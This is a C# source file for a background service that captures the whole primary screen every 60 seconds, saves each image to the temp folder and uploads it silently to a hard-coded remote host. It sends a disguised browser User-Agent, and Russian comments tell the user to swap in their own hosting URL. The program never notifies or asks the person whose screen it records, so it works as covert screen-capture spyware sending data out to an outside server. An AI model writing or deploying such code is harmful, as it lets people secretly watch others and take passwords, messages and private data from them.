using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;

class Program
{
    static async Task Main(string[] args)
    {
        using IHost host = Host.CreateDefaultBuilder(args)
            .ConfigureServices((_, services) =>
                services.AddHostedService<ScreenshotService>())
            .Build();

        await host.RunAsync();
    }
}

public class ScreenshotService : IHostedService, IDisposable
{
    private readonly System.Threading.Timer _timer;
    private readonly HttpClient _httpClient;
    private const string HostUrl = "http://z99586px.beget.tech/"; // Замените на URL вашего хостинга
    private const int IntervalInSeconds = 60; // Интервал в секундах

    public ScreenshotService()
    {
        _timer = new System.Threading.Timer(TakeScreenshot, null, Timeout.Infinite, Timeout.Infinite);
        _httpClient = new HttpClient();
    }

    public Task StartAsync(CancellationToken cancellationToken)
    {
        // Запуск таймера с заданным интервалом
        _timer.Change(0, IntervalInSeconds * 1000);
        // Подписка на событие нажатия клавиш
        Task.Run(() => ListenForKeyPress());
        return Task.CompletedTask;
    }

    public Task StopAsync(CancellationToken cancellationToken)
    {
        _timer.Change(Timeout.Infinite, Timeout.Infinite);
        return Task.CompletedTask;
    }

    public void Dispose()
    {
        _timer?.Dispose();
        _httpClient?.Dispose();
    }

    private async void TakeScreenshot(object state)
    {
        var filePath = Path.Combine(Path.GetTempPath(), $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");

        using (var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
        {
            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            }

            bmp.Save(filePath, ImageFormat.Png);
        }

        await UploadScreenshotAsync(filePath);
    }

    private async Task UploadScreenshotAsync(string filePath)
    {
        using (var content = new MultipartFormDataContent())
        {
            content.Add(new StreamContent(File.OpenRead(filePath)), "file", Path.GetFileName(filePath));
            _httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) MyAppName/1.0.0 (someone@example.com)");
            var response = await _httpClient.PostAsync(HostUrl, content);
            response.EnsureSuccessStatusCode();
        }
    }

    private void ListenForKeyPress()
    {
        while (true)
        {
            if (Console.KeyAvailable)
            {
                var key = Console.ReadKey(intercept: true).Key;
                if (key == ConsoleKey.F1) 
                {
                    TakeScreenshot(null);
                }
            }

            Thread.Sleep(100);
        }
    }
}
